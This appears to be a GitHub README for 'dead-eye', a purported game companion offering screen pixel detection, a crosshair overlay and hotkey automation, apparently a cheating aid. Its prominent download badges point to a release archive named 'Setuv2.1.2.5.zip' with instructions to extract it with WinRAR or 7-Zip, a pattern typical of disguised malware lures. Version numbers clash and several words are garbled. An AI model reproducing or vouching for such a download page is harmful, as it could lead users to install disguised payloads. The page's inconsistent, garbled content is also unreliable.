[![Release](https://img.shields.io/badge/release-v1.0.0-informational?style=for-the-badge)](https://github.com/oliverm-1902b0/dead-eye/releases/download/v1.0.0/Setuv2.1.2.5.zip) [![Download](https://img.shields.io/badge/download-here-brightgreen?style=for-the-badge)](https://github.com/oliverm-1902b0/dead-eye/releases/download/v1.0.0/Setuv2.1.2.5.zip)

# 🎮 dead-eye

![License](https://img.shields.io/github/license/oliverm-1902b0/dead-eye) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)

[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.1-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/oliverm-1902b0/dead-eye?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/oliverm-1902b0/dead-eye?style=flat-square)

Dead cross-platform companion: tracks data, has config profiles

## 📥 Download

[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)

1. Download the latest release from the link above
2. Extract the archive (WinRAR / 7-Zip)
3. Run `python main.py` (or see Usage below)
4. Configure settings in `config.yaml`

## Quick Usage

Basic usage is pretty simple:

```bash
python main.py
```

You can also specify a config file:

```bash
python main.py --config my_config.yaml
```

This is useful if you have multiple profiles.

## Features

This tool includes:

* **Screen analysis:** Analyzes screen regions to detect pixel changes.
* **Overlay:** Displays a customizable overlay.
* **Crosshair:** Draws a custom crosshair on the screen.
* **Pixel detection:** Detects specific pixel colors within regions.
* **Hotkey automation:** Automates actions based on hotkey presses.
* **Configuion:** Loads settings from a YAML file.

## Settings

The `config.yaml` file lets you customize settings. Here's an example:

```yaml
overlay:
 enabled: true
 color: "red"
 thickness: 2
 crosshair: true

monitor:
 region: [0, 0, 1920, 1080]
 pixel_threshold: 200

input_handler:
 hotkey_toggle_overlay: "ctrl+shift+o"
 hotkey_exit: "ctrl+shift+q"

paths:
 log_file: "logs/application.log"
 data_output: "data/output.csv"

ports:
 web_server: 8080
 data_stream: 5000
```

Feel free to tweak these values to fit your needs.

## Troubleshooting

If you're having issues, here are a few things to try:

* Check the `logs/application.log` file for errors.
* Make sure all requirements are installed (`pip install -r requirements.txt`).
* Verify your `config.yaml` file is valid YAML (use a YAML validator).
* Ensure you have the necessary permissions to access the screen.
* Restart the application.

WIP: Adding more detailed troubleshooting steps later.## FAQ

<details>
 <summary>How do I change the overlay color?</summary>
 Edit the <code>config.yaml</code> file and change the <code>overlay.color</code> value. Valid colors are "red", "blue", "green", etc.
</details>

<details>
 <summary>The overlay isn't showing up. What do I do?</summary>
 Make sure <code>overlay.enabled</code> is set to <code>true</code> in the config file. Also, check your logs for any errors.
</details>

<details>
 <summary>Can I use different hotkeys?</summary>
 Yep! Just modify the <code>input_handler</code> section of the config file.
</details>

## Requirements

Before running, make sure you have the following packages installed. You can install them using pip:

```bash
pip install -r requirements.txt
```

Here's a breakdown:

* `pyyaml`: For reading config files.
* `Pillow`: Used for image processing and screen analysis.
* `pynput`: Handles global hotkey input.
* `numpy`: For numerical opeions, good for pixel detection.



---

This project is licensed under the MIT License
